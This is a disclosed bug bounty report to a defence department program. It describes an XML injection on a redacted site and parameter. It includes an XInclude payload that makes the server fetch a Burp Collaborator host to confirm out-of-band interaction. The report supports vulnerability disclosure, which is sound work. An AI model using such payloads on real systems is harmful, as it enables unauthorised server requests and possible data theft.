# XML Injection on https://www.█████████ (███ parameter)

## Report Details
- **Report ID**: 997381
- **URL**: https://hackerone.com/reports/997381
- **State**: Closed
- **Severity**: high
- **Submitted**: 2020-10-03T23:47:37.995Z
- **Disclosed**: 2021-04-02T18:43:46.824Z

## Reporter
- **Username**: fiveguyslover
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: deptofdefense

## Vulnerability Information
Greetings,

I found an XML injection on https://www.███.
This kind of vulnerability can be difficult to detect and exploit remotely; you should review the application's response
here is the complete link: https://www.███/███████
Payload : 

`███████=<vuc xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="http://9bligh4snzlirzuxt4lbu3zullrbf0.burpcollaborator.net/foo"/></vuc>`

Result : 

███

best regards, 
frenchvlad

## Impact

gaining the access to the unauthorized parts and stealing the sensitive data would be the most important thing to know when it comes to XML’s impact.

## Attachments
No attachments
